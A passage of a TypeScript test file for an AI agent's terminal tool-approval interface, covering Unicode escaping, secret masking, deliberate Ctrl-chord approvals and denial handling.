import type { ToolFileDiff, ToolPreview } from '@relavium/core';
import { describe, expect, it, vi } from 'vitest';
import {
  createReviewDocument,
  escapeReviewCharacter,
  projectReviewPage,
  REVIEW_START,
  reviewBytes,
} from './tool-review-projection.js';
import {
  acknowledgeToolReview,
  initialToolReview,
  isAffirmativeReviewKey,
  isAlwaysConfirmKey,
  isTypingIntoReview,
  reduceToolReviewKey,
  reviewAnswerKey,
  reviewInspected,
  reviewOffersAlways,
  toolReviewPage,
  toolReviewTarget,
} from './tool-review-model.js';
import { createChatStore } from './chat-store.js';
import {
  CARD_KEY_ROWS,
  CARD_RULE_ROWS,
  CARD_VERB_COLUMNS,
  cardRowBudget,
  cardWarnings,
} from './tool-review-card.js';
import { displayWidth } from './viewport.js';
import { INLINE_TRANSCRIPT_BOUND } from './session-view-model.js';
import { transcriptDocument, wrapTranscript } from './chat-projection.js';
import { editedFilePreview } from './fixtures/edit-diff.js';

function replacement(before: string | null, after: string): ToolPreview {
  const ending = (text: string): 'lf' | 'crlf' | 'none' =>
    text.endsWith('\r\n') ? 'crlf' : text.endsWith('\n') ? 'lf' : 'none';
  const lines: ToolFileDiff['lines'][number][] = [];
  for (const [kind, text] of [
    ['removed', before],
    ['added', after],
  ] as const) {
    if (text === null || text.length === 0) continue;
    const end = ending(text);
    lines.push({
      kind,
      text: text.slice(0, text.length - (end === 'crlf' ? 2 : end === 'lf' ? 1 : 0)),
      ending: end,
      ...(kind === 'removed'
        ? { before: { line: 1, start: 0, end: text.length } }
        : { after: { line: 1, start: 0, end: text.length } }),
    });
  }
  return {
    kind: 'operation',
    target: 'file.txt',
    fields: [],
    diff: {
      before,
      after,
      lines,
      beforeEndings: before === null || before === '' ? 'empty' : ending(before),
      afterEndings: after === '' ? 'empty' : ending(after),
      stats: {
        addedLines: after === '' ? 0 : 1,
        removedLines: before === '' || before === null ? 0 : 1,
        beforeBytes: reviewBytes(before ?? ''),
        afterBytes: reviewBytes(after),
      },
    },
  };
}
/**
 * `total` lines of `line n` with ONE line inserted after line `afterLine`, as the engine's line diff delivers it: the only
 * changed line starts far into its field (an absolute offset), unlike the first line of a new file.
 */
function insertedLinePreview(total: number, afterLine: number, inserted: string): ToolPreview {
  const sides = { before: 0, after: 0 };
  const span = (side: 'before' | 'after', line: number, text: string) => {
    const start = sides[side];
    sides[side] += text.length + 1;
    return { line, start, end: sides[side] };
  };
  const original = Array.from({ length: total }, (_, index) => `line ${index + 1}`);
  const lines: ToolFileDiff['lines'][number][] = [];
  const after: string[] = [];
  original.forEach((text, index) => {
    after.push(text);
    lines.push({
      kind: 'context',
      text,
      ending: 'lf',
      before: span('before', index + 1, text),
      after: span('after', after.length, text),
    });
    if (index + 1 !== afterLine) return;
    after.push(inserted);
    lines.push({
      kind: 'added',
      text: inserted,
      ending: 'lf',
      after: span('after', after.length, inserted),
    });
  });
  const bytes = (rows: readonly string[]): number => reviewBytes(`${rows.join('\n')}\n`);
  return {
    kind: 'operation',
    target: 'src/app.ts',
    fields: [],
    diff: {
      before: `${original.join('\n')}\n`,
      after: `${after.join('\n')}\n`,
      beforeEndings: 'lf',
      afterEndings: 'lf',
      stats: {
        addedLines: 1,
        removedLines: 0,
        beforeBytes: bytes(original),
        afterBytes: bytes(after),
      },
      lines,
    },
  };
}
const page = (preview: ToolPreview, reveal = false) =>
  projectReviewPage(createReviewDocument(preview), REVIEW_START, 78, 20, reveal);
/**
 * Every key that ANSWERS an approval card is a Ctrl chord — Ctrl+Y allow, Ctrl+G session-wide (then Enter), Ctrl+N deny,
 * Ctrl+R deny with a reason. A bare letter answers nothing: while a turn runs the person is often typing the next
 * instruction, and a letter typed at a card that has just appeared is indistinguishable from a deliberate press (PR #99).
 * One place names the chord, so a test says `CTRL` where it means "the answer key" and `{}` where it means "a stray key".
 */
const CTRL = { ctrl: true } as const;

describe('review source projection', () => {
  it.each([
    ['<TAB>', '\t'],
    ['<SP>', ' '],
    ['<U+202E>', '\u202e'],
    ['<U+003C>', '<'],
    ['<LF>', '\n'],
    ['<EOF:NO_NEWLINE>', ''],
    ['<MASK:id=1;bytes=5>', '\u2800'],
    ['·', '\t'],
  ])('keeps literal %j distinguishable from synthetic %j without color', (literal, source) => {
    const left = page({ kind: 'operation', fields: [{ name: 'test', value: literal }] }).rows.join(
      '\n',
    );
    const right = page({ kind: 'operation', fields: [{ name: 'test', value: source }] }).rows.join(
      '\n',
    );
    expect(left).not.toBe(right);
    if (literal.includes('<')) expect(left).toContain('<U+003C>');
  });
  it.each([
    '\u2028',
    '\u2029',
    '\u200b',
    '\ufe0f',
    '\u2800',
    '\u{16fe4}',
    '\u{1d159}',
    '\u{e0049}',
    '\ud800',
    '\u00a0',
    '\r',
    '\u001b',
  ])('makes invisible source %j printable', (char) => {
    expect(escapeReviewCharacter(char, false)).toMatch(/^<U\+[0-9A-F]+>$/u);
  });
  it('preserves exact line endings and the real final-newline-only change on both sides', () => {
    const final = page(replacement('same', 'same\n')).rows.join('\n');
    expect(final).toContain('-1 same<EOF:NO_NEWLINE>');
    expect(final).toContain('+1 same<LF>');
    expect(page(replacement('same\r\n', 'same\n')).rows.join('\n')).toContain('-1 same<CRLF>');
    // Both sides uniformly LF: the ending carries no information, so the ordinary line prints no token
    // (ADR-0129 §4) — yet the trailing whitespace on the removed line is still spelled out.
    const ordinary = page(replacement('x \t\n', 'x·\n')).rows.join('\n');
    expect(ordinary).toContain('-1 x<SP><TAB>');
    expect(ordinary).not.toContain('<LF>');
  });
  it('keeps <EOF:NO_NEWLINE> on the unterminated side of a final-newline-only change in a uniform LF file', () => {
    // What the core diff emits for `a\nb` -> `a\nb\n`: both sides classify as lf (the unterminated last line
    // is ignored), the unchanged first line is context, and only the last line differs by its ending.
    const before = 'a\nb';
    const after = 'a\nb\n';
    const rows = page({
      kind: 'operation',
      target: 'file.txt',
      fields: [],
      diff: {
        before,
        after,
        beforeEndings: 'lf',
        afterEndings: 'lf',
        stats: { addedLines: 1, removedLines: 1, beforeBytes: 3, afterBytes: 4 },
        lines: [
          {
            kind: 'context',
            text: 'a',
            ending: 'lf',
            before: { line: 1, start: 0, end: 2 },
            after: { line: 1, start: 0, end: 2 },
          },
          { kind: 'removed', text: 'b', ending: 'none', before: { line: 2, start: 2, end: 3 } },
          { kind: 'added', text: 'b', ending: 'lf', after: { line: 2, start: 2, end: 4 } },
        ],
      },
    }).rows.join('\n');
    expect(rows).toContain('-2 b<EOF:NO_NEWLINE>');
    expect(rows).toContain('+2 b');
    expect(rows).not.toContain('<LF>');
  });
  it('prints an ending token on a side whose ending differs from the other side, and none when both agree', () => {
    // LF → CRLF: nothing may look unchanged, so both sides spell their ending.
    const converted = page(replacement('a\n', 'a\r\n')).rows.join('\n');
    expect(converted).toContain('-1 a<LF>');
    expect(converted).toContain('+1 a<CRLF>');
    // CRLF replaced by CRLF is uniform on both sides: no token (the card states "CRLF endings" instead).
    expect(page(replacement('a\r\n', 'b\r\n')).rows.join('\n')).not.toContain('<CRLF>');
    // A new LF or CRLF file has an empty other side and is uniform: no per-line token either.
    expect(page(replacement(null, 'a\n')).rows.join('\n')).not.toContain('<LF>');
    expect(page(replacement(null, 'a\r\n')).rows.join('\n')).not.toContain('<CRLF>');
  });
  it('keeps new empty files explicit and never invents an unterminated source line', () => {
    const document = createReviewDocument(replacement(null, ''));
    expect(document.preview.diff?.before).toBeNull();
    expect(document.lines).toHaveLength(1); // declared target only
    expect(projectReviewPage(document, REVIEW_START, 78, 20).rows.join('\n')).not.toContain(
      '<EOF:NO_NEWLINE>',
    );
  });
  it.each(['before', 'after'] as const)(
    'refuses a full-detail %s source exceeding the byte ceiling even when its UTF-16 length fits',
    (side) => {
      const source = '界'.repeat(Math.floor((8 * 1024 * 1024) / 3) + 1);
      expect(source.length).toBeLessThan(8 * 1024 * 1024);
      expect(
        createReviewDocument(
          replacement(side === 'before' ? source : null, side === 'after' ? source : ''),
        ).valid,
      ).toBe(false);
    },
  );
  it('retains original spans and byte lengths, with a whole-field fallback for uncertain normalized masks', () => {
    const value = '😀 Bearer sk-proj-abcdefghijklmnopqrstuvw';
    const document = createReviewDocument({
      kind: 'operation',
      fields: [{ name: 'value', value }],
    });
    const mask = document.masks[0];
    expect(mask).toMatchObject({ start: 10, end: value.length, bytes: 31 });
    expect(
      page({ kind: 'operation', fields: [{ name: 'value', value }] }).rows.join('\n'),
    ).not.toContain('abcdefghijkl');
    const ambiguous = 'sk-proj-abcdef\nghijklmnopqrstuvw';
    const fallback = createReviewDocument({
      kind: 'operation',
      fields: [{ name: 'value', value: ambiguous }],
    }).masks[0];
    expect(fallback).toMatchObject({ start: 0, end: ambiguous.length });
  });
  it('fails closed on source/span disagreement and over-budget fields', () => {
    const preview = replacement('old', 'new');
    if (preview.diff === undefined) throw new Error('missing diff');
    expect(
      createReviewDocument({ ...preview, diff: { ...preview.diff, after: 'wrong' } }).valid,
    ).toBe(false);
    expect(
      createReviewDocument({ kind: 'operation', target: 'x'.repeat(4097), fields: [] }).valid,
    ).toBe(false);
  });
  it('lazily traverses a long line without splitting tokens or dropping original intervals', () => {
    const value = 'a'.repeat(20_000) + '<\u{e0049} ';
    const document = createReviewDocument(replacement('', value));
    let cursor = REVIEW_START,
      seen = 0,
      pages = 0;
    for (;;) {
      const current = projectReviewPage(document, cursor, 78, 7, true, true);
      expect(current.valid).toBe(true);
      for (const row of current.rows) expect(row.length).toBeLessThanOrEqual(78);
      seen += current.shown
        .filter((range) => range.field === 2)
        .reduce((sum, range) => sum + range.end - range.start, 0);
      pages++;
      if (current.next === undefined) break;
      cursor = current.next;
      expect(pages).toBeLessThan(1000);
    }
    expect(seen).toBe(value.length);
  });
});

describe('review approval state', () => {
  it('requires deliberate reveal AND acknowledged coverage for entirely masked changed lines', () => {
    const document = createReviewDocument(
      replacement(
        'Bearer sk-proj-abcdefghijklmnopqrstuvw',
        'Bearer sk-proj-zyxwvutsrqponmlkjihgfed',
      ),
    );
    let state = initialToolReview('approval', 'id', document);
    expect(reviewInspected(state)).toBe(false);
    const card = projectReviewPage(document, REVIEW_START, 78, 4);
    expect(reduceToolReviewKey(state, 'y', CTRL, true, card, true, 0).kind).toBe('none');
    const full = reduceToolReviewKey(state, 'v', {}, true, card, true, 0);
    if (full.kind !== 'state') throw new Error('expected full view');
    state = full.state;
    const reveal = reduceToolReviewKey(state, 'r', {}, true, page(document.preview), true, 0);
    if (reveal.kind !== 'state') throw new Error('expected reveal');
    state = reveal.state;
    expect(reviewInspected(state)).toBe(false);
    expect(reduceToolReviewKey(state, 'y', CTRL, false, undefined, true, 0).kind).toBe('none');
    state = acknowledgeToolReview(state, projectReviewPage(document, REVIEW_START, 78, 20, true));
    expect(reviewInspected(state)).toBe(true);
    expect(
      reduceToolReviewKey(state, 'y', CTRL, true, page(document.preview, true), true, 0),
    ).toEqual({ kind: 'approve', scope: 'once' });
    // The same inspected state answers nothing to the bare letter: the chord is what makes it an answer.
    expect(
      reduceToolReviewKey(state, 'y', {}, true, page(document.preview, true), true, 0),
    ).toEqual({ kind: 'none' });
  });
  it('never treats navigation, reveal, modified/coalesced input or a hidden frame as affirmative', () => {
    const state = {
      ...initialToolReview('approval', 'id', createReviewDocument(replacement('a', 'b'))),
      screen: 'full' as const,
    };
    for (const input of ['r', 'ry', 'ya', '\ny'])
      expect(reduceToolReviewKey(state, input, {}, true, undefined, true, 0).kind).not.toBe(
        'approve',
      );
    expect(reduceToolReviewKey(state, 'y', CTRL, false, undefined, true, 0).kind).toBe('none');
    expect(reduceToolReviewKey(state, 'a', { meta: true }, true, undefined, true, 0).kind).toBe(
      'none',
    );
    // Ctrl+Alt+Y is not Ctrl+Y: a meta-modified chord answers nothing.
    expect(
      reduceToolReviewKey(state, 'y', { ctrl: true, meta: true }, true, undefined, true, 0).kind,
    ).toBe('none');
    // Not cacheable: Ctrl+G grants nothing, whatever the page.
    expect(reduceToolReviewKey(state, 'g', CTRL, true, undefined, false, 0).kind).toBe('none');
  });
});

describe('[Ctrl+N] is a plain deny that needs no acknowledged frame', () => {
  const approval = () =>
    initialToolReview('approval', 'id', createReviewDocument(replacement('a', 'b')));

  it('denies a card or full view whose frame is not visible, exactly as it does when it is visible', () => {
    for (const state of [approval(), { ...approval(), screen: 'full' as const }]) {
      const visible = reduceToolReviewKey(state, 'n', CTRL, true, undefined, false, 0);
      const hidden = reduceToolReviewKey(state, 'n', CTRL, false, undefined, false, 0);
      expect(visible).toEqual({ kind: 'deny' });
      expect(hidden).toEqual(visible);
    }
  });

  it('is not a bare [n]: a letter typed at the card denies nothing, whether the frame is visible or not', () => {
    for (const state of [approval(), { ...approval(), screen: 'full' as const }])
      for (const visible of [true, false])
        expect(reduceToolReviewKey(state, 'n', {}, visible, undefined, false, 0).kind).toBe('none');
  });

  it('still refuses every other answer and every modified [Ctrl+N] while the frame is not visible', () => {
    const state = approval();
    // Ctrl+Y (allow), Ctrl+G (always) and Ctrl+R (reason) need the visible frame; only the plain deny does not.
    for (const input of ['y', 'g', 'r'])
      expect(reduceToolReviewKey(state, input, CTRL, false, undefined, true, 0).kind, input).toBe(
        'none',
      );
    // The bare letters that used to answer answer nothing at all (visible or not), and neither does a modified Ctrl+N.
    for (const input of ['y', 'a', 'c', 'b', 'r', 'n'])
      expect(reduceToolReviewKey(state, input, {}, false, undefined, true, 0).kind, input).toBe(
        'none',
      );
    for (const key of [{ meta: true }, { ctrl: true, meta: true }])
      expect(reduceToolReviewKey(state, 'n', key, false, undefined, true, 0).kind).toBe('none');
  });

  it('keeps [n] as typed text in a denial reason, a search and a details view, visible or not', () => {
    const typing = { ...approval(), denial: '' };
    expect(reduceToolReviewKey(typing, 'n', {}, false, undefined, false, 0).kind).toBe('none');
    expect(reduceToolReviewKey(typing, 'n', {}, true, undefined, false, 0)).toMatchObject({
      kind: 'state',
      state: { denial: 'n' },
    });
    const searching = { ...approval(), screen: 'full' as const, searching: true, query: '' };
    expect(reduceToolReviewKey(searching, 'n', {}, false, undefined, false, 0).kind).toBe('none');
    const details = initialToolReview('details', 'id', createReviewDocument(replacement('a', 'b')));
    expect(reduceToolReviewKey(details, 'n', {}, false, undefined, false, 0).kind).toBe('none');
    expect(reduceToolReviewKey(details, 'n', {}, true, undefined, false, 0).kind).toBe('none');
  });

  it('does not let a Ctrl+N deny from inside a denial reason, a search or a details view: a chord is not an answer there', () => {
    const typing = { ...approval(), denial: 'because' };
    const searching = { ...approval(), screen: 'full' as const, searching: true, query: 'q' };
    const details = initialToolReview('details', 'id', createReviewDocument(replacement('a', 'b')));
    for (const state of [typing, searching, details])
      for (const visible of [true, false])
        expect(reduceToolReviewKey(state, 'n', CTRL, visible, undefined, false, 0)).toEqual({
          kind: 'none',
        });
  });

  it('resolves the pending approval as a denial — not an abort — when the review is not visible', async () => {
    const store = createChatStore(false, undefined, INLINE_TRANSCRIPT_BOUND);
    const answer = store.requestApproval(
      { toolId: 'write_file', action: 'fs_write', preview: { path: 'file.txt' } },
      true,
      undefined,
      { callId: 'hidden-deny', preview: replacement('a', 'b') },
    );
    store.bindReviewVisibility(() => false);
    expect(store.handleReviewInput('y', CTRL)).toBe('handled');
    expect(store.handleReviewInput('g', CTRL)).toBe('handled');
    expect(store.getSnapshot().approval, 'Ctrl+Y and Ctrl+G answer nothing').toBeDefined();
    // The bare letter that used to deny denies nothing now: a letter typed at a card is typing.
    expect(store.handleReviewInput('n', {})).toBe('handled');
    expect(store.getSnapshot().approval, 'a bare n denies nothing').toBeDefined();
    expect(store.handleReviewInput('n', CTRL)).toBe('handled');
    expect(await answer).toEqual({ outcome: 'reject' });
    expect(store.getSnapshot().approval).toBeUndefined();
  });
});

describe('ephemeral tool display ownership', () => {
  it('orders assistant segments and same-name calls by engine id, while seeds and hatches exclude previews', () => {
    const store = createChatStore(false, undefined, INLINE_TRANSCRIPT_BOUND);
    store.apply({
      type: 'agent:token',
      sessionId: 's',
      sequenceNumber: 1,
      timestamp: '2026-11-12T00:00:00Z',
      nodeId: 'n',
      token: 'First',
      model: 'm',
    });
    store.applyToolLiveEvent({ phase: 'started', callId: 'one', toolId: 'write_file' });
    store.applyToolLiveEvent({
      phase: 'preview',
      callId: 'one',
      toolId: 'write_file',
      preview: replacement('private-before', 'private-after'),
    });
    store.applyToolLiveEvent({
      phase: 'completed',
      callId: 'one',
      toolId: 'write_file',
      outcome: 'denied',
    });
    store.applyToolLiveEvent({ phase: 'started', callId: 'two', toolId: 'write_file' });
    store.applyToolLiveEvent({
      phase: 'completed',
      callId: 'two',
      toolId: 'write_file',
      outcome: 'success',
    });
    const entries = store.getSnapshot().state.transcript;
    expect(entries.map((entry) => entry.role)).toEqual(['assistant', 'tools', 'tools']);
    expect(
      wrapTranscript(entries, 80, false, store.getSnapshot().toolDisplays)
        .map((line) => line.text)
        .join('\n'),
    ).toContain('denied');
    expect(transcriptDocument(entries)).not.toContain('file.txt');
    expect(JSON.stringify(entries)).not.toContain('private-');
    store.sealToolPreviews();
    store.applyToolLiveEvent({
      phase: 'preview',
      callId: 'late',
      toolId: 'write_file',
      preview: replacement('late-private', 'late-after'),
    });
    expect(store.getSnapshot().toolDisplays.size).toBe(0);
    expect(store.getSnapshot().review).toBeUndefined();
  });
});

it.each(['git_status', 'mcp:server:custom'])(
  'opens the retained bounded summary of %s without a declared preview',
  (toolId) => {
    const store = createChatStore(false, undefined, INLINE_TRANSCRIPT_BOUND);
    store.applyToolLiveEvent({ phase: 'started', callId: 'summary', toolId });
    store.applyToolLiveEvent({
      phase: 'completed',
      callId: 'summary',
      toolId,
      outcome: 'failure',
      summary: 'Bearer sk-proj-abcdefghijklmnopqrstuvw',
    });
    store.openDetails();
    store.bindReviewVisibility(() => true);
    store.handleReviewInput('', { return: true });
    const review = store.getSnapshot().review;
    expect(review?.screen).toBe('full');
    expect(review?.callId).toBe('summary');
    expect(review?.document?.preview.target).toBeUndefined();
    expect(review?.document?.preview.diff).toBeUndefined();
    const shown =
      review?.document === undefined
        ? ''
        : projectReviewPage(review.document, REVIEW_START, 78, 20).rows.join('\n');
    expect(shown).toContain('Preview unavailable');
    expect(shown).toContain('Result summary');
    expect(shown).not.toContain('abcdefghijkl');
  },
);

it('keeps the selected details call stable when older calls are evicted', () => {
  const store = createChatStore(false, undefined, INLINE_TRANSCRIPT_BOUND);
  for (let index = 0; index < 64; index++)
    store.applyToolLiveEvent({ phase: 'started', callId: `call-${index}`, toolId: 'git_status' });
  store.openDetails();
  store.bindReviewVisibility(() => true);
  store.handleReviewInput('', { downArrow: true });
  store.applyToolLiveEvent({ phase: 'started', callId: 'new-call', toolId: 'git_status' });
  expect(store.getSnapshot().toolDisplays.has('call-0')).toBe(false);
  expect(store.getSnapshot().review?.selected).toBe(0);
  store.handleReviewInput('', { return: true });
  expect(store.getSnapshot().review?.callId).toBe('call-1');
  store.handleReviewInput('b', {});
  store.handleReviewInput('', { return: true });
  expect(store.getSnapshot().review?.callId).toBe('call-1');
});

it('closes the details list when its selected call is evicted', () => {
  const store = createChatStore(false, undefined, INLINE_TRANSCRIPT_BOUND);
  for (let index = 0; index < 64; index++)
    store.applyToolLiveEvent({ phase: 'started', callId: `call-${index}`, toolId: 'git_status' });
  store.openDetails();
  store.bindReviewVisibility(() => true);
  store.applyToolLiveEvent({ phase: 'started', callId: 'new-call', toolId: 'git_status' });
  expect(store.getSnapshot().toolDisplays.has('call-0')).toBe(false);
  expect(store.getSnapshot().review).toBeUndefined();
  expect(store.handleReviewInput('', { return: true })).toBeUndefined();
});

it('opens the retained summary after the actual aggregate preview budget evicts a document', () => {
  const store = createChatStore(false, undefined, INLINE_TRANSCRIPT_BOUND);
  // Four-byte source preserves the real byte-budget proof with less code-point indexing work.
  const full = replacement('😀'.repeat(2 * 1024 * 1024), '😎'.repeat(2 * 1024 * 1024));
  store.applyToolLiveEvent({ phase: 'started', callId: 'evicted', toolId: 'write_file' });
  store.applyToolLiveEvent({
    phase: 'preview',
    callId: 'evicted',
    toolId: 'write_file',
    preview: { ...full, target: 'DO_NOT_RECONSTRUCT' },
  });
  store.applyToolLiveEvent({
    phase: 'completed',
    callId: 'evicted',
    toolId: 'write_file',
    outcome: 'success',
    summary: 'Retained result',
  });
  // Two complete 8 MiB before/after snapshots plus targets exceed the real 32 MiB budget.
  store.applyToolLiveEvent({
    phase: 'preview',
    callId: 'newer',
    toolId: 'write_file',
    preview: full,
  });
  expect(store.getSnapshot().toolDisplays.get('evicted')?.document).toBeUndefined();
  store.openDetails();
  store.bindReviewVisibility(() => true);
  store.handleReviewInput('', { return: true });
  expect(store.getSnapshot().review?.callId).toBe('evicted');
  const preview = store.getSnapshot().review?.document?.preview;
  expect(preview?.target).toBeUndefined();
  expect(preview?.diff).toBeUndefined();
  expect(preview?.fields).toContainEqual({ name: 'Result summary', value: 'Retained result' });
  expect(JSON.stringify(preview)).not.toContain('DO_NOT_RECONSTRUCT');
});

it('copies only the escaped masked page after reveal, and never leaks raw details through transcript hatches', async () => {
  const store = createChatStore(false, undefined, INLINE_TRANSCRIPT_BOUND);
  store.applyToolLiveEvent({ phase: 'started', callId: 'copy', toolId: 'write_file' });
  store.applyToolLiveEvent({
    phase: 'preview',
    callId: 'copy',
    toolId: 'write_file',
    preview: replacement(
      'Bearer sk-proj-abcdefghijklmnopqrstuvw',
      'Bearer sk-proj-zyxwvutsrqponmlkjihgfed',
    ),
  });
  store.applyToolLiveEvent({
    phase: 'completed',
    callId: 'copy',
    toolId: 'write_file',
    outcome: 'success',
    summary: 'Completed',
  });
  store.openDetails();
  store.bindReviewVisibility(() => true);
  store.handleReviewInput('', { return: true });
  store.handleReviewInput('r', {});
  const review = store.getSnapshot().review;
  if (review === undefined) throw new Error('missing review');
  store.acknowledgeReviewFrame(review, toolReviewPage(review, 80, 24));
  let copied: string | undefined;
  store.bindReviewClipboard((text) => {
    copied = text;
    return Promise.resolve(true);
  });
  store.handleReviewInput('c', {});
  await vi.waitFor(() => expect(copied).toBeDefined());
  expect(copied).toContain('<MASK:');
  expect(copied).not.toMatch(/abcdefghijkl|zyxwvutsrq/);
  expect(transcriptDocument(store.getSnapshot().state.transcript)).not.toContain('file.txt');
  expect(JSON.stringify(store.getSnapshot().state)).not.toMatch(/abcdefghijkl|zyxwvutsrq/);
});

it('keeps existing denial reasons as an owned view action', () => {
  const state = initialToolReview(
    'approval',
    'reason',
    createReviewDocument(replacement('a', 'b')),
  );
  // A bare `c` opens nothing on the card; Ctrl+R opens the reason box.
  expect(reduceToolReviewKey(state, 'c', {}, true, undefined, false, 0)).toEqual({ kind: 'none' });
  const opened = reduceToolReviewKey(state, 'r', CTRL, true, undefined, false, 0);
  if (opened.kind !== 'state') throw new Error('missing reason view');
  const typed = reduceToolReviewKey(opened.state, 'x', {}, true, undefined, false, 0);
  if (typed.kind !== 'state') throw new Error('missing reason text');
  expect(reduceToolReviewKey(typed.state, '', { return: true }, true, undefined, false, 0)).toEqual(
    { kind: 'deny', reason: 'x' },
  );
});

it('preserves the full typed reason through redaction before the submission cap', () => {
  let state = { ...initialToolReview('approval'), denial: '' };
  const credential = `sk-${'C'.repeat(60)}`;
  for (const input of `${'x '.repeat(140)}${credential}`) {
    const action = reduceToolReviewKey(state, input, {}, true, undefined, false, 0);
    if (action.kind !== 'state' || action.state.denial === undefined)
      throw new Error('missing denial capture');
    state = { ...action.state, denial: action.state.denial };
  }
  const submitted = reduceToolReviewKey(state, '', { return: true }, true, undefined, false, 0);
  expect(submitted.kind).toBe('deny');
  expect(JSON.stringify(submitted)).toContain('[REDACTED]');
  expect(JSON.stringify(submitted)).not.toContain('sk-');
  const oversized = { ...state, denial: 'x'.repeat(4096) };
  const overflow = reduceToolReviewKey(oversized, 'x', {}, true, undefined, false, 0);
  if (overflow.kind !== 'state') throw new Error('missing overflow capture');
  expect(
    reduceToolReviewKey(overflow.state, '', { return: true }, true, undefined, false, 0),
  ).toEqual({ kind: 'deny', reason: 'denial explanation omitted (too long)' });
});

it.each([
  [78, 2],
  [118, 16],
])(
  'keeps revealed numeric copy inside the exact %s-column, %s-row source window',
  (columns, rows) => {
    const document = createReviewDocument({
      kind: 'operation',
      fields: [{ name: 'value', value: 'sk-proj-' + 'a'.repeat(900) + ' FUTURE_UNSEEN' }],
    });
    const mask = document.masks[0];
    if (mask === undefined) throw new Error('missing test mask');
    const cursor = { line: 1, offset: mask.start + 30 };
    const revealed = projectReviewPage(document, cursor, columns, rows, true, true);
    const independentMasked = projectReviewPage(document, cursor, columns, rows, false, true);
    expect(revealed.valid).toBe(true);
    expect(independentMasked.rows.join('\n')).toContain('<U+0046>');
    const companion = revealed.maskedRows.join('\n');
    expect(companion).not.toContain('FUTURE_UNSEEN');
    expect(companion).not.toContain('<U+0046>');
    expect(companion).not.toContain('aaaa');
    const maskedBytes = [...companion.matchAll(/<MASK:id=(\d+);bytes=(\d+)>/gu)];
    expect(maskedBytes.every((match) => Number(match[1]) === mask.id)).toBe(true);
    expect(maskedBytes.reduce((sum, match) => sum + Number(match[2]), 0)).toBe(
      revealed.shown.reduce(
        (sum, range) =>
          sum + reviewBytes(document.fields[range.field]?.text.slice(range.start, range.end) ?? ''),
        0,
      ),
    );
  },
);

it('pages all 4096 admitted target characters without reveal, while requiring acknowledged full-target inspection', () => {
  const document = createReviewDocument({
    kind: 'operation',
    target: 'x'.repeat(4096),
    fields: [],
  });
  let state = initialToolReview('approval', 'long', document);
  const earlyFull = toolReviewPage({ ...state, screen: 'full' }, 80, 24);
  expect(earlyFull?.requiredTarget).toEqual({ field: 0, start: 0, end: 4096 });
  const card = toolReviewPage(state, 80, 24);
  const header = toolReviewTarget(state, 80, 24);
  expect(card?.valid).toBe(true);
  expect(header?.hiddenBytes).toBe(4096 - (header?.next?.offset ?? 0));
  if (card === undefined) throw new Error('missing card');
  state = acknowledgeToolReview(state, card);
  expect(reviewInspected(state)).toBe(false);
  expect(reduceToolReviewKey(state, 'y', CTRL, true, card, false, 0).kind).toBe('none');
  state = { ...state, screen: 'full' };
  let pages = 0;
  for (;;) {
    const page = toolReviewPage(state, 80, 24);
    if (page === undefined) throw new Error('missing page');
    expect(page.valid).toBe(true);
    state = acknowledgeToolReview(state, page);
    pages++;
    if (page.next === undefined) break;
    expect(page.hiddenBytes).toBe(4096 - page.next.offset);
    state = { ...state, cursor: page.next };
    expect(pages).toBeLessThan(100);
  }
  expect(pages).toBeGreaterThan(1);
  expect(state.reveal).toBe(false);
  expect(reviewInspected(state)).toBe(true);
  expect(
    reduceToolReviewKey(state, 'y', CTRL, true, toolReviewPage(state, 80, 24), false, 0),
  ).toEqual({ kind: 'approve', scope: 'once' });
  expect(
    createReviewDocument({ kind: 'operation', target: 'x'.repeat(4097), fields: [] }).valid,
  ).toBe(false);
});

describe('the target budget leaves room for the verb the card prints before it', () => {
  const stateFor = (target: string) =>
    initialToolReview(
      'approval',
      'budget',
      createReviewDocument({ kind: 'operation', target, fields: [] }),
    );

  it.each([70, 71, 78, 120])(
    'draws every projected row of a %i-character target inside the title row, with the longest verb',
    (length) => {
      const rows = toolReviewTarget(stateFor('d'.repeat(length)), 80, 24)?.rows ?? [];
      expect(rows.length).toBeGreaterThan(0);
      rows.forEach((row, index) => {
        // The card strips the `target ` label and prints `<verb> <row>` first, `  <row>` after it.
        const drawn = row.slice('target '.length);
        const title = index === 0 ? `Overwrite ${drawn}` : `  ${drawn}`;
        expect(displayWidth(title), `row ${index}`).toBeLessThanOrEqual(80 - 2);
      });
    },
  );

  it('marks the target shortened — and requires inspecting it — exactly when it no longer fits the title rows', () => {
    // 80 columns: 78 drawable − 10 for `Overwrite ` − 7 for the `target ` label inside the projection, over two rows.
    const fits = 2 * (80 - 2 - CARD_VERB_COLUMNS - 'target '.length);
    const whole = toolReviewPage(stateFor('d'.repeat(fits)), 80, 24);
    expect(whole?.requiredTarget, 'a target that fits needs no extra inspection').toBeUndefined();
    const cut = toolReviewPage(stateFor('d'.repeat(fits + 1)), 80, 24);
    expect(cut?.requiredTarget).toEqual({ field: 0, start: 0, end: fits + 1 });
    if (cut === undefined) throw new Error('missing card');
    expect(
      reduceToolReviewKey(
        acknowledgeToolReview(stateFor('d'.repeat(fits + 1)), cut),
        'y',
        CTRL,
        true,
        cut,
        false,
        0,
      ).kind,
    ).toBe('none');
  });
});

it('keeps a short fully visible target eligible for a one-chord approval on the acknowledged card', () => {
  const state = initialToolReview(
    'approval',
    'short',
    createReviewDocument({ kind: 'operation', target: 'safe.txt', fields: [] }),
  );
  const page = toolReviewPage(state, 80, 24);
  if (page === undefined) throw new Error('missing short card');
  const acknowledged = acknowledgeToolReview(state, page);
  expect(acknowledged.requiredTarget).toBeUndefined();
  expect(reduceToolReviewKey(acknowledged, 'y', CTRL, true, page, false, 0)).toEqual({
    kind: 'approve',
    scope: 'once',
  });
});

it('refuses explicit copy when no source page has been acknowledged', async () => {
  const store = createChatStore(false, undefined, INLINE_TRANSCRIPT_BOUND);
  store.applyToolLiveEvent({
    phase: 'preview',
    callId: 'no-frame',
    toolId: 'git_status',
    preview: { kind: 'operation', target: 'safe.txt', fields: [] },
  });
  store.openDetails();
  store.bindReviewVisibility(() => true);
  store.handleReviewInput('', { return: true });
  const copy = vi.fn(() => Promise.resolve(true));
  store.bindReviewClipboard(copy);
  store.handleReviewInput('c', {});
  await Promise.resolve();
  expect(copy).not.toHaveBeenCalled();
  expect(store.getSnapshot().review?.message).toContain('flushed frame');
});

describe('bounded visible review search', () => {
  const search = (value: string, query: string, offset = 0, reveal = false) => {
    const document = createReviewDocument({
      kind: 'operation',
      fields: [{ name: 'value', value }],
    });
    const state = {
      ...initialToolReview('details', 'search', document),
      searching: true,
      query,
      reveal,
      cursor: { line: 1, offset },
    };
